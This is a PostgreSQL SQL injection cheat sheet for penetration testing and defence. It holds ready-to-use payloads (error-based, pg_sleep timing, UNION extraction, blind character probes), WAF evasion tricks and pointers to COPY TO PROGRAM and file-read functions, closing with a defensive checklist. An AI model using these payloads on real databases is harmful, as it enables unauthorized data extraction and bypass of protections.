# PostgreSQL — SQLi Notes

> Practical notes for testing and defending **PostgreSQL (9.6 → 16/17)**. Focus: fingerprinting, catalogs, delay/error primitives, UNION/stacking behavior, powerful but restricted features, and safe engineering guidance.

---

## 1) Quick Fingerprinting
- **Engine & version**
  - `SELECT version();` — banner.
  - `SHOW server_version;` — clean version.
- **Identity & context**
  - `SELECT current_user;`, `SELECT session_user;`
  - `SELECT current_database();`
  - `SELECT inet_server_addr(), inet_server_port();` (when allowed)

---

## 2) Comments, Quoting, Concatenation
- **Comments:** `--`, `/* ... */`.
- **Strings:** `'text'`; E-strings `E'line\nbreak'` for escapes.
- **Dollar‑quoting:** `$$ ... $$` (and `$tag$` variants) for procedural blocks/evasion.
- **Concat:** `'||'`; cast with `x::text` / `CAST(x AS text)`.

---

## 3) System Catalogs & Info Schema
- Preferred: `pg_class`, `pg_namespace`, `pg_attribute`, `pg_type`, `pg_roles`, `pg_indexes`.
- Portable: `information_schema.tables`, `information_schema.columns`.

**Handy queries**
```sql
SELECT nspname FROM pg_namespace WHERE nspname NOT LIKE 'pg_%' AND nspname <> 'information_schema';
SELECT relname FROM pg_class c JOIN pg_namespace n ON n.oid = c.relnamespace
WHERE n.nspname='public' AND c.relkind='r';
SELECT attname, format_type(atttypid, atttypmod) AS data_type
FROM pg_attribute WHERE attrelid = 'public.users'::regclass AND attnum > 0 AND NOT attisdropped ORDER BY attnum;
```

---

## 4) Error‑based Primitives
Cast/parse errors may echo values:
```sql
' AND CAST((SELECT current_database()) AS INT) -- -
' AND (SELECT 1/0) -- -       -- division by zero (no data echo)
```

---

## 5) Time‑based Primitives
```sql
' AND pg_sleep(3) -- -
' AND CASE WHEN current_user='postgres' THEN pg_sleep(3) ELSE pg_sleep(0) END -- -
' AND pg_sleep_for('3 seconds') -- -
```

---

## 6) UNION‑based Notes
- Match column count; align types (`::text`).
```sql
' UNION ALL SELECT 1,version(),3 -- -
' UNION ALL SELECT 1,current_database(),3 -- -
```
- Identify printable column with markers.

---

## 7) Stacked & Procedural Blocks
- Multiple statements often allowed; some frameworks sanitize.
- `DO $$ BEGIN ... END $$;` requires `plpgsql` (usually present).

---

## 8) OOB & High‑Privilege Features
- `COPY ... TO PROGRAM` (superuser or `pg_execute_server_program` role).
- File read functions (`pg_read_file`) gated by roles (`pg_read_server_files`).
- Extensions (FDWs, `dblink`) can reach out when installed.

---

## 9) Pagination & Iteration
```sql
SELECT table_name FROM information_schema.tables WHERE table_schema='public' ORDER BY table_name LIMIT 1 OFFSET 0;
' AND ASCII(SUBSTRING((SELECT current_user),1,1))>77 -- -
```

---

## 10) String Aggregation
- `string_agg(expr, ',' ORDER BY expr)` or `array_agg` + `array_to_string`.

---

## 11) Privileges & Security
```sql
SELECT rolname, rolsuper, rolcreaterole, rolcreatedb FROM pg_roles WHERE rolname=current_user;
SELECT * FROM pg_has_role(current_user, oid, 'member') AS is_member, rolname FROM pg_roles;
```
Restrict superuser‑like roles; avoid `COPY PROGRAM` grants to app roles.

---

## 12) Evasion Tips
- Mixed case/comment splitting: `p/**/g_sleep`.
- Dollar‑quoting to bypass quoting issues.
- Build strings with `CHR()` / `decode(...,'hex')`.

---

## 13) Defensive Checklist
- Parameterize queries; do not concatenate.
- Restrict roles (`superuser`, `pg_execute_server_program`, file‑read roles).
- Egress filter DB subnets; block outbound HTTP/DNS.
- Generic error handling; tests around vulnerable params.

---

## 14) Handy One‑liners
```sql
SELECT version(), current_database(), current_user;
SELECT table_name FROM information_schema.tables WHERE table_schema='public' ORDER BY table_name LIMIT 1;
' AND CASE WHEN ASCII(SUBSTRING((SELECT current_user),1,1))>77 THEN pg_sleep(3) ELSE pg_sleep(0) END -- -
```
